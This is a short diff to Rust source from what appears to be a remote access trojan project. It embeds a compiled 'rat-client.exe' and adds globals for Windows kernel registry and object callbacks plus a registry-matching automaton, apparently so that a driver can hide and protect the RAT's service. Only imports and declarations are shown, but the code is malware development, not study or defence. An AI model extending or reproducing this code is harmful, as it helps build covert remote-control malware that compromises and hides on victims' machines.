@@ -1,3 +1,8 @@
+use core::ffi::c_void;
+use core::ptr;
+use core::sync::atomic::{AtomicI64, AtomicPtr};
+
+use aho_corasick::AhoCorasick;
 use const_format::formatcp;
 use rat_common::global::WINDOWS_SERVICE_NAME;
 use widestring::{U16CStr, u16cstr};
@@ -20,3 +25,7 @@ pub const RAT_CLIENT: &[u8] = include_bytes!("../../target/debug/rat-client.exe"
 
 #[cfg(not(debug_assertions))]
 pub const RAT_CLIENT: &[u8] = include_bytes!("../../target/release/rat-client.exe");
+
+pub static SERVICE_REGISTRY_AHO_CORASICK: AtomicPtr<AhoCorasick> = AtomicPtr::new(ptr::null_mut());
+pub static OB_REGISTER_CALLBACKS_HANDLE: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
+pub static CM_REGISTER_CALLBACK_COOKIE: AtomicI64 = AtomicI64::new(0);
